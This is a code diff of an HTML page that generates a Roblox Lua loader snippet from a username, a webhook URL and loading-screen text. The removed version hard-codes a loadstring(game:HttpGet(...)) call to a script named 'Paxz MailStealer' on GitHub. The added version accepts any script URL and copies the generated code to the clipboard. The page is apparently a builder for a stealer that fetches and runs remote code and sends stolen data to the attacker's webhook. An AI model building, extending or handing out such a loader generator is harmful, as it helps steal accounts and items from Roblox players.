@@ -1,61 +1,72 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Text Generator</title>
-    <style>
-      body {
-        background-image: url('https://wallpapercave.com/wp/wp4575209.jpg');
-        background-size: cover;
-        font-family: Arial, sans-serif;
-      }
-      #container {
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-      }
-      input {
-        margin: 10px;
-        padding: 10px;
-        border-radius: 5px;
-        border: none;
-        background-color: rgba(255, 255, 255, 0.5);
-      }
-      button {
-        margin: 10px;
-        padding: 10px;
-        border-radius: 5px;
-        border: none;
-        background-color: #4285f4;
-        color: #fff;
-        cursor: pointer;
-      }
-      button:hover {
-        background-color: #0d47a1;
-      }
-    </style>
-  </head>
-  <body>
-    <div id="container">
-      <input id="username" type="text" placeholder="Username">
-      <input id="webhook" type="text" placeholder="Webhook">
-      <input id="loadingText" type="text" placeholder="Loading Text">
-      <input id="script" type="text" readonly>
-      <button onclick="generateScript()">Generate Script</button>
-    </div>
-    <script>
-      function generateScript() {
-        var username = document.getElementById("username").value;
-        var webhook = document.getElementById("webhook").value;
-        var loadingText = document.getElementById("loadingText").value;
-        var script = "_G.UserName = \"" + username + "\";\n" +
-                     "_G.Webhook = \"" + webhook + "\";\n" +
-                     "_G.loadingScreenText = \"" + loadingText + "\";\n\n" +
-                     'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
-        document.getElementById("script").value = script;
-      }
-    </script>
-  </body>
+<head>
+	<title>Textbox Generator</title>
+	<style>
+		body {
+			background-image: url('https://wallpapercave.com/wp/wp4575209.jpg');
+			background-size: cover;
+		}
+		.textbox {
+			width: 300px;
+			height: 30px;
+			margin-bottom: 10px;
+			font-size: 16px;
+			border-radius: 5px;
+			border: none;
+			padding: 5px;
+		}
+		.textbox4 {
+			width: 300px;
+			height: 120px;
+			margin-bottom: 10px;
+			font-size: 16px;
+			border-radius: 5px;
+			border: none;
+			padding: 5px;
+		}
+		.button {
+			background-color: #4CAF50;
+			border: none;
+			color: white;
+			padding: 10px 20px;
+			text-align: center;
+			text-decoration: none;
+			display: inline-block;
+			font-size: 16px;
+			margin-bottom: 10px;
+			cursor: pointer;
+			border-radius: 5px;
+		}
+	</style>
+</head>
+<body>
+	<div align="center">
+		<form>
+			<input class="textbox" type="text" placeholder="Username" id="username"><br>
+			<input class="textbox" type="text" placeholder="Webhook" id="webhook"><br>
+			<input class="textbox" type="text" placeholder="Loading Text" id="loadingtext"><br>
+			<textarea class="textbox4" placeholder="Script" id="script"></textarea><br>
+			<button class="button" type="button" onclick="generateCode()">Generate Code</button><br>
+		</form>
+	</div>
+
+	<script>
+		function generateCode() {
+			var username = document.getElementById("username").value;
+			var webhook = document.getElementById("webhook").value;
+			var loadingtext = document.getElementById("loadingtext").value;
+			var script = document.getElementById("script").value;
+
+			var code = "_G.UserName = \"" + username + "\"\n";
+			code += "_G.Webhook = \"" + webhook + "\"\n";
+			code += "_G.loadingScreenText = \"" + loadingtext + "\"\n";
+			code += "\n";
+			code += "loadstring(game:HttpGet(\"" + script + "\"))()";
+
+			navigator.clipboard.writeText(code);
+			alert("Code copied to clipboard!");
+		}
+	</script>
+</body>
 </html>
